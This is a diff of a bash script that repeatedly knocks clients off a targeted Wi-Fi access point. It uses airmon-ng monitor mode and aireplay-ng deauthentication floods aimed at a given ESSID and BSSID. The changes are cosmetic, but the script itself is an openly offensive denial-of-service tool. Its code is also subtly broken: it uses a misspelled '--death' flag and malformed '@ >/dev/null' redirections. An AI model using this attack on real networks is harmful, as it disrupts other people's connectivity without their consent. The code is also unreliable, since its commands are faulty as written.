@@ -10,7 +10,7 @@ if [ $EUID -ne 0 ]; then
 	exit 1
 fi
 
-function deathClients {
+function deathClients() {
 	echo -e "\tDeathing clients in AP: $essid / $bssid, $ch"
 	iface=$1
 	essid=$2
@@ -18,11 +18,11 @@ function deathClients {
 	ch=$4
 	deaths=$5
 
-	airmon-ng stop ${iface}mon @> /dev/null
+	airmon-ng stop ${iface}mon @ >/dev/null
 	sleep 2
 
 	echo -e "\t[1] Starting monitor on channel $ch"
-	airmon-ng start $iface $ch @> /dev/null
+	airmon-ng start $iface $ch @ >/dev/null
 	sleep 3
 
 	if [ -z "$(ls /sys/class/net | paste | grep ${iface}mon)" ]; then
@@ -30,7 +30,7 @@ function deathClients {
 		sleep 3
 		return
 	fi
-	
+
 	echo -e "\t[2] Deathing $deaths number of times..."
 	aireplay-ng --death $deaths -e $essid -a $bssid ${iface}mon
 }
@@ -71,7 +71,7 @@ for i in $(seq 0 $retry); do
 			echo "[!] You must specify <bssid> for ESSID: $essid"
 			exit 1
 		fi
-		
+
 		deathClients $iface $essid $bssid $ch $deaths
 	done
 done
